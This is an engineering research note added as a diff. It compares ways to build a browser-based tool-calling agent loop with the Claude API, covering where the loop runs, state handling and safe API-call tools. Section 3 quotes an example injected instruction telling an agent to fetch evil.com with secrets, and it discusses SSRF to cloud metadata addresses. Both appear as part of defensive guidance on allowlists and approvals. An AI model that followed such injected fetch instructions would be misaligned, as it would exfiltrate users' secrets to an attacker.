@@ -1,0 +1,179 @@
+#+TITLE: E3: The agent loop, where it runs, and safe API-call tools
+#+OPTIONS: ^:{} -:nil
+#+DATE: 2026-10-28
+
+Tags: [O] = observed (read in the cited source, or run). [I] = inferred.
+
+* Question
+
+How is a tool-calling agent loop for a web page built, where should it run (browser, server or a hybrid), and how do tools that call APIs work safely? Feeds goals R2 and R3 and the open question "Where does the agent loop run: browser or server?" in [[file:../brief.org][brief.org]].
+
+* Method
+
+All on 2026-10-28, one pass.
+
+- [O] Read the bundled =claude-api= skill (cached 2026-10-06): =shared/tool-use-concepts.md= (tool runner vs manual loop, eager input streaming, pause_turn, MCP connector, mid-conversation tool changes, context editing), =shared/agent-design.md= (dedicated tools vs bash, context management, caching for agents), =typescript/claude-api/tool-use.md= (tool runner, streaming manual loop), the SKILL index (models, compaction, caching, web fetch tool).
+- [O] Fetched [[https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview][Claude docs: Tool use overview]] (client vs server tools, round trip, tool token overhead).
+- [O] Web searches (result summaries only, not full pages): Anthropic browser CORS header; Vercel AI SDK client-side tools; OpenAI Agents SDK JS human-in-the-loop; LangGraph.js interrupts; agent fetch-tool SSRF / MCP security.
+- *Could not fetch*: =ai-sdk.dev= and =openai.github.io= (outside the session's allowed network domains). AI SDK and OpenAI Agents SDK facts come from search-result snippets and are thinner. No source found for XState-based LLM loops (=statelyai/agent=); that row is inferred.
+- Nothing was run.
+
+* Findings
+
+** Comparison: loop implementations
+
+| Option | What you write | Runs in browser? | Client (DOM) tools | Explicit states | Weight | Tag |
+|--------------------------+------------------------------------+------------------------------+-----------------------------------+----------------------------+--------+-----|
+| Manual Messages API loop | ~30 lines while-loop | Yes (CORS opt-in header) | Native: you run every tool | You define them | Tiny | [O] |
+| Anthropic SDK tool runner | Tool fns + Zod/JSON schema | Likely (same TS SDK) | Yes; per-turn hooks | Implicit (iterations) | Small | [O]/[I] |
+| Vercel AI SDK (=useChat=) | Server route + React hook | Model call on server | =onToolCall= + =addToolOutput= | Tool part states in UI msgs | Medium | [O] |
+| OpenAI Agents SDK (JS) | Agents, tools, handoffs | RealtimeAgent: yes | Approvals via =interruptions= | RunState, resumable | Medium | [O] |
+| LangGraph.js | Graph of nodes + checkpointer | Server-oriented | =interrupt()= + =Command= resume | Graph nodes, persisted | Heavy | [O] |
+| XState loop | Statechart around the API call | Yes | Actions/invoked actors | First-class, visualisable | Small-med | [I] |
+| Claude Agent SDK | prompt + options | No (Node/Python process) | Via MCP / custom tools | Internal | Heavy | [O] |
+| Managed Agents | Agent config; send tool results | No (Anthropic-hosted) | Custom tools round-trip | Session events (SSE) | Platform | [O] |
+
+** Comparison: where the loop runs
+
+| Placement | API key | CORS for data APIs | DOM tool latency | Secrets for APIs | Simplicity | Tag |
+|-----------------------------------+------------------------+--------------------+---------------------+-----------------------+-------------------+-----|
+| Browser-only | Exposed (BYOK only) | Each API must allow | Zero (in-process) | Cannot hide | Simplest | [O]/[I] |
+| Server-only | Hidden | None (server fetch) | N/A: no live DOM | Server env | Simple, no DOM | [I] |
+| Hybrid: server loop, browser tools | Hidden | None for server tools | 1 extra round trip | Server env | Medium | [I] |
+| Thin proxy: browser loop, server relays model + fetch | Hidden | None (proxy fetch) | Zero | Proxy injects | Simple | [I] |
+
+** Comparison: API-call tool shapes
+
+| Shape | Model writes | Safety surface | Model-facing result | Tag |
+|------------------------------------+------------------------------+-------------------------------------+----------------------------+-----|
+| Generic =http_fetch(url, ...)= | Any URL | SSRF, exfiltration, CORS | Raw body; must truncate | [I] |
+| Registered connectors (=get_weather=) | Typed args only | Small: server owns URL + key | Pre-shaped JSON | [O]/[I] |
+| Claude =web_fetch= server tool | URL already in conversation | Anthropic runs it; domain lists | Document block, token cap | [O] |
+| MCP servers (connector or own client) | Tool args | Third-party server trust, injection | Tool result | [O] |
+| Code execution / programmatic calling | Script that calls tools | Sandbox | Only the script's final output | [O] |
+
+** 1. The minimal loop, as a state machine
+
+- [O] Everything goes through one endpoint, =POST /v1/messages=. Client tools come back as =stop_reason: "tool_use"= with one or more =tool_use= blocks; your code runs them and sends =tool_result= blocks in the next =user= message; repeat until =end_turn=. Source: [[https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview][tool use overview]].
+- [O] Rules that keep the loop correct: append the *full* =response.content= (not only text) as the assistant turn; answer every =tool_use_id=; return all parallel results in *one* user message (splitting them teaches the model to stop calling in parallel); report failures as =is_error: true= rather than dropping them. Source: skill =tool-use-concepts.md=.
+- [O] Other stop reasons the state machine must handle: =max_tokens= (a tool input may be truncated: do not run it), =refusal= (never run that turn's tools; on Opus 5.5 / Sonnet 5.5 the skill recommends server-side =fallbacks=), =pause_turn= (server-tool loop hit its limit; resend and the server resumes). Source: skill.
+- [O] Streaming: =client.messages.stream(...)= emits text deltas; =finalMessage()= yields the complete message to inspect =stop_reason=. Set =eager_input_streaming: true= on client tools so large tool inputs (e.g. an HTML fragment for the page) stream as they are generated; the client must then validate each input against its schema. Source: skill =typescript/claude-api/tool-use.md=.
+- [O] The SDK *tool runner* (=client.beta.messages.toolRunner= with =betaZodTool= / =betaTool=) does the loop for you and still yields each assistant message before tools run, so approval gates, result rewriting, =max_iterations=, streaming and compaction are available without a hand loop. It is beta. Source: skill.
+- [O] Current models expose no forced tool choice: =tool_choice= =any= / =tool= returns 400 on =claude-opus-5-5= and =claude-sonnet-5-5=; use =auto= plus =strict: true= and a prompt instruction. Thinking cannot be disabled on Opus 5.5 (effort default =medium=). Source: skill.
+- [O] Tool-use overhead is small: 286 system-prompt tokens on Opus 5.5 / Sonnet 5.5 / Haiku 5.5, plus the tool definitions. Source: tool use overview.
+- [I] Cancellation: the TS SDK stream can be aborted; an aborted turn leaves the transcript with a partial assistant message, so the safe rule is to discard the partial turn (or keep only completed text) and never leave a =tool_use= without a matching =tool_result= in history.
+
+States the UI can show (R3):
+
+| State | Enter on | Leave on | Tag |
+|------------------+-----------------------------------+----------------------------------------------------+-----|
+| idle | page load; turn finished | user sends message | [I] |
+| calling_model | user message or tool results sent | stream ends (=stop_reason=) / error / cancel | [O] |
+| running_tools | =stop_reason == tool_use= | all results collected / cancel | [O] |
+| awaiting_approval | a gated tool (e.g. external POST) | user approves / declines (declined = error result) | [O] |
+| awaiting_user | =end_turn= (model asked a question or done) | user sends message | [I] |
+| error | API error, invalid tool JSON, max iterations | retry / user message | [O] |
+| cancelled | user hits stop | back to idle, partial turn discarded | [I] |
+
+Minimal loop sketch [I] (TypeScript-flavoured pseudocode; =api= is either the SDK or a proxy):
+
+#+begin_src typescript
+type State = "idle"|"calling_model"|"running_tools"|"awaiting_approval"|"error";
+let messages: MessageParam[] = [];          // the whole conversation
+const MAX_STEPS = 12;
+
+async function send(userText: string, signal: AbortSignal) {
+  messages.push({ role: "user", content: [pageSnapshot(), text(userText)] });
+  for (let step = 0; step < MAX_STEPS; step++) {
+    setState("calling_model");
+    const stream = api.messages.stream(
+      { model: "claude-sonnet-5-5", max_tokens: 16000, system: SYSTEM,
+        tools: TOOLS, messages, cache_control: { type: "ephemeral" } },
+      { signal });
+    stream.on("text", (d) => ui.appendAssistantText(d));
+    const msg = await stream.finalMessage();   // throws on abort / API error
+    messages.push({ role: "assistant", content: msg.content });
+    if (msg.stop_reason === "pause_turn") continue;
+    if (msg.stop_reason !== "tool_use") { setState("idle"); return; }  // end_turn, refusal, max_tokens
+    setState("running_tools");
+    const calls = msg.content.filter((b) => b.type === "tool_use");
+    const results = await Promise.all(calls.map(async (c) => {
+      const tool = REGISTRY[c.name];
+      const input = tool?.schema.safeParse(c.input);
+      if (!tool || !input.success) return err(c.id, "invalid tool or input");
+      if (tool.needsApproval && !(await askUser(c))) return err(c.id, "user declined");
+      try { return ok(c.id, truncate(await tool.run(input.data), 20_000)); }
+      catch (e) { return err(c.id, String(e)); }
+    }));
+    messages.push({ role: "user", content: results });   // one message, all results
+  }
+  setState("error"); ui.say("Stopped: too many steps.");
+}
+#+end_src
+
+** 1b. Other frameworks, briefly
+
+- [O] *Vercel AI SDK*: client-side tools omit =execute= on the server; the browser handles them in =useChat='s =onToolCall= and returns output with =addToolOutput= (=addToolResult= in older versions); =sendAutomaticallyWhen: lastAssistantMessageIsCompleteWithToolCalls= resubmits once all results are present. Server tools with =execute= run in the API route. This is exactly the hybrid pattern below, prepackaged. Sources (snippets; pages unfetchable): [[https://ai-sdk.dev/v5/docs/ai-sdk-ui/chatbot-tool-usage][AI SDK v5 chatbot tool usage]], [[https://v6.ai-sdk.dev/docs/ai-sdk-ui/chatbot-tool-usage][v6 docs]].
+- [O] *OpenAI Agents SDK (JS)*: tools needing approval pause the run, return =interruptions=, and resume from a serialisable =RunState=; =RealtimeAgent= can run in the browser for voice. Source: [[https://openai.github.io/openai-agents-js/guides/human-in-the-loop][HITL guide]] (snippet only). OpenAI models; listed for pattern only.
+- [O] *LangGraph.js*: =interrupt()= inside a node saves graph state via a checkpointer keyed by =thread_id=; resume with =Command=. Durable, explicit graph states; more machinery than one page needs. Source: [[https://docs.langchain.com/oss/javascript/langgraph/interrupts][LangGraph.js interrupts]] (snippet).
+- [I] *XState*: the state table above maps directly onto a statechart whose =calling_model= state invokes a streaming promise/actor and =running_tools= invokes the tool batch. Gains: visualised, testable states and clean cancellation (exiting a state stops its actor). Cost: a dependency and a concept for ~7 states. No source fetched.
+- [O] *Claude Agent SDK*: Claude Code as a library (built-in file/bash/web tools, sessions, subagents); runs as a Node/Python process you host, so not in the page. Overkill for DOM and connector tools. Source: skill SKILL.md.
+- [O] *Managed Agents*: Anthropic runs the loop and a sandbox; custom tools still round-trip to your client over an event stream. Fits long-running server agents, not a page-bound chat. Source: skill.
+
+** 2. Browser vs server vs hybrid
+
+- [O] The Claude API accepts browser calls only with the opt-in header =anthropic-dangerous-direct-browser-access: true=; without it browsers get a 401 CORS error. The name signals that a key embedded in page code can be stolen by anyone who loads the page; acceptable only for internal tools or bring-your-own-key. Source: [[https://simonwillison.net/2024/Aug/23/anthropic-dangerous-direct-browser-access][Willison, 2024-08-23]] (secondary; not checked against Anthropic docs). The TS SDK has a matching =dangerouslyAllowBrowser= option [O: named in skill =api-version-migration.md=].
+- [I] Browser-only also cannot hide keys for data APIs and is limited to APIs that send permissive CORS headers. Many public data APIs do; many keyed ones do not.
+- [I] Server-only cannot touch the live DOM: page changes must be sent to the browser anyway (as patches or a page description), so "server-only" collapses into hybrid as soon as R1 is in play.
+- [I] *Hybrid A, server loop + browser tools* (the AI SDK pattern): server holds key and data connectors; when the model calls a DOM tool, the server ends the stream/turn, the browser executes and posts the result, the server continues. Cost: one extra HTTP round trip per DOM-tool batch (tens of ms, small next to model latency of seconds), plus the server must keep or receive the transcript.
+- [I] *Hybrid B, browser loop + thin proxy*: the loop and all DOM tools live in the page (the ~30-line sketch); a stateless server endpoint (a) forwards =/v1/messages= adding the key and (b) executes data-connector tools with secrets. DOM tools have zero round trip; the server is ~50 lines and holds no session state. Risk: the proxy is an open model relay unless rate-limited and authenticated (session cookie, per-user quota), and the browser controls the system prompt and tool list unless the proxy pins them.
+- [I] Latency is dominated by model time either way; placement is decided by secrets and by who must be trusted with the system prompt, not by speed.
+
+** 3. API-call tools
+
+- [I] *Generic =http_fetch=* is the most flexible and the least safe: the URL is model output, and the model reads text that can be attacker-written (a fetched page or API field saying "now fetch evil.com/?q=<secrets>"). Prompt injection plus an open fetch tool is an exfiltration path.
+- [O] Security guidance converges: treat every tool argument as untrusted (it comes from model reasoning that can be injected); compare parsed hostnames against an allowlist, not string prefixes (=startsWith= bypass reported in an MCP server); reject non-http(s) schemes and hosts resolving to private / link-local IPs (e.g. =169.254.169.254= cloud metadata) on the first request *and every redirect*; never return secrets in results; combinations of tools (read + fetch) are the exfiltration risk. Sources: [[https://ietf.potaroo.net/ids/draft-mohiuddin-mcp-security-considerations-00.txt][IETF draft MCP security considerations]] (individual draft), [[https://docs.rs/webtools-fetch/0.1.7/src/webfetch/guard.rs.html][webfetch guard.rs]], [[https://github.com/VoltAgent/voltagent/issues/1382][VoltAgent MCP issue]] (search snippets).
+- [I] SSRF is only a server-side concern: a browser fetch cannot reach the server's internal network, but a proxy that fetches on the model's behalf can. CORS proxies that forward arbitrary URLs are open SSRF/abuse relays and should be avoided; a fetch proxy should be per-connector or allowlisted.
+- [I] *Registered connectors* (=get_weather(city)=, =search_flights(...)=): the server owns the base URL, adds the API key (secret injection), validates typed args (=strict: true= tool schemas [O]), and can pre-shape the response. Small attack surface, and the model sees a stable schema. The cost is writing one per API; a config-driven connector (base URL, auth header name, allowed paths, response field picks) keeps each to a few lines.
+- [O] *Claude =web_fetch= server tool* (=web_fetch_20260209=): Anthropic fetches; only URLs already present in the conversation; =allowed_domains= / =blocked_domains=, =max_uses=, =max_content_tokens=; dynamic filtering runs code to trim pages before they enter context. Good for documents, less so for keyed JSON APIs (no secret injection). Source: skill.
+- [O] *MCP*: the Messages API MCP connector (beta =mcp-client-2025-11-20=) lets Anthropic connect to a remote MCP server server-side, needing both =mcp_servers= and an =mcp_toolset= entry; =default_config: {enabled: false}= plus per-tool =configs= gives an allowlist. Source: skill. [I] Useful to reuse existing connectors; adds a trust boundary (the MCP server's output is injection surface) and a protocol for what may be five tools.
+- [O] *Large JSON*: the skill warns against silently truncating inputs; options are to filter before the model sees data. Programmatic tool calling (=code_execution_20260120= + =allowed_callers=) lets the model write a script that calls tools and returns only the final output, so token cost scales with output, not intermediate data. Source: skill =agent-design.md=.
+- [I] Cheaper patterns for a page: (a) connector returns a projection (picked fields, first N rows) plus metadata (=total_rows=, schema/shape summary, =truncated: true=); (b) store the full response client- or server-side under a =data_id= and give the model a =query_data(data_id, jq_expr | fields | limit)= tool; (c) render tools take =data_id= plus a mapping (x field, y field, chart type) so bulk data never round-trips through the model at all. (c) is the key one for R2: the model decides *how* to display data while the data goes straight from API to component.
+
+** 4. Context for a long-lived page session
+
+- [O] Prompt caching is a prefix match over =tools= → =system= → =messages=; any byte change earlier invalidates everything after. Keep tools and system frozen; put volatile content late. Changing tools or model mid-session invalidates the cache; mid-conversation =role: "system"= messages (Opus 5.5, Sonnet 5.5, Haiku 5.5) add instructions without breaking the cached prefix; mid-conversation tool changes (beta) add/remove deferred tools without a cache reset. Top-level =cache_control= auto-caches the tail. Verify with =usage.cache_read_input_tokens=. Source: skill.
+- [I] *Page state in context*: putting the whole page into the system prompt would invalidate the cache on every change. Instead append a compact page snapshot (structured page description or outline with element ids, not raw HTML) to each user turn, or give the model a =get_page= tool and only a short outline per turn. Old snapshots stay in history (append-only) and are pruned by context editing.
+- [O] *Context editing* (beta =context-management-2025-06-27=, =clear_tool_uses_20250919=) clears old tool results server-side: suited to stale API payloads and old page snapshots. *Compaction* (beta =compact-2026-01-12=) summarises history when it nears a trigger (default 150K tokens); the client must append full =response.content= so compaction blocks survive. Source: skill.
+- [O] Current models are on "preserved thinking": editing earlier turns invalidates replayed thinking blocks (enforced for accounts created on/after 2026-08-31). Harnesses should be append-only; prune with server-side context editing or compaction, not client-side history edits. Source: skill SKILL.md.
+- [I] For a session of a few dozen turns with projected data, a 1M-token window and caching mean no compaction is needed in a first version; =clear_tool_uses= is the first lever when payloads grow.
+
+* Patterns
+
+- [O] The loop is the same everywhere: call model → if =tool_use=, run tools, append results, repeat; frameworks differ in where tools execute and how pauses (approval, client tools) are represented.
+- [O] Client-executed tools are the industry pattern for UI actions: AI SDK (=onToolCall=), OpenAI Agents (interruptions), LangGraph (=interrupt=) all model "the browser must do something" as a paused run that resumes with a result.
+- [O] Dedicated, typed tools over generic ones where an action needs gating, rendering or audit (skill =agent-design.md=); the same logic argues for connectors over =http_fetch=.
+- [O] Data filtering before context (dynamic filtering, programmatic tool calling, context editing) is the provider-endorsed answer to large payloads.
+- [I] Keys stay on a server in every production pattern found; browser-direct calls are framed as BYOK or internal-tool only.
+
+* Bearing on the design
+
+/Opinion, not evidence./
+
+- *Where the loop runs* (open question): Hybrid B: the loop and DOM tools in the browser, a thin stateless server that forwards model calls with the key and runs data connectors with their secrets. It keeps the loop tiny and DOM tools instant, hides every key, and avoids CORS. Lock the system prompt and tool list on the proxy, and rate-limit it. If the brief's "who sees the changes" question lands on (c) shared site, move to Hybrid A (server loop), because the server must then own the transcript and validate page writes anyway.
+- *R3*: Hand-write the ~30-line loop with an explicit 6-7 state enum. The SDK tool runner is a fine alternative but hides the states the UI wants to show, and it is beta. XState only if the states grow (approvals, retries, multi-pane). LangGraph, Agent SDK and Managed Agents are heavier than this needs.
+- *R2*: Registered, config-driven connectors with server-side secret injection and hostname allowlists; no generic =http_fetch= in v1. Return projections plus a =data_id=; let render tools bind components to =data_id= so the model chooses the display without carrying the data.
+- *R4 (simple)*: The whole agent side needs only =@anthropic-ai/sdk= (or plain =fetch= to the proxy), a schema validator, and ~100 lines of server. No agent framework required.
+- *Model*: =claude-sonnet-5-5= for the page loop is a reasonable cost/latency starting point, with =claude-opus-5-5= the skill default; latency of a turn is the UX risk, so measure. Use =auto= tool choice and =strict: true=.
+
+* Leads
+
+- Probe: build the 30-line browser loop + 50-line proxy against one public API (weather) and one DOM tool; measure turn latency, tokens per turn and cache hit rate.
+- Probe: does the TS SDK =toolRunner= run in the browser behind a proxy =baseURL=, and does it expose enough per-step events to drive the state enum?
+- Thread: how should the proxy authenticate an anonymous visitor and cap spend per session (cookie + quota, Turnstile, per-IP)?
+- Thread: =data_id= store: browser memory vs server cache; what happens on reload (ties to the brief's persistence question).
+- Probe: page-state representation in context: outline vs full structured description vs =get_page= tool; tokens and accuracy over 30 turns.
+- Thread: prompt injection from API data that then drives DOM tools (e.g. a field containing instructions to insert a link or script); which DOM tools need approval or sanitisation (overlaps E1/E2).
+- Check: fetch the AI SDK and OpenAI Agents JS docs directly (blocked here: =ai-sdk.dev=, =openai.github.io= need to be allowed in network settings) to confirm method names and browser support.
+- Check: Anthropic's own documentation of =anthropic-dangerous-direct-browser-access= (only a secondary source was read).
+- Check: cancellation semantics: what the API bills and what history should hold after aborting a stream mid-tool-input.
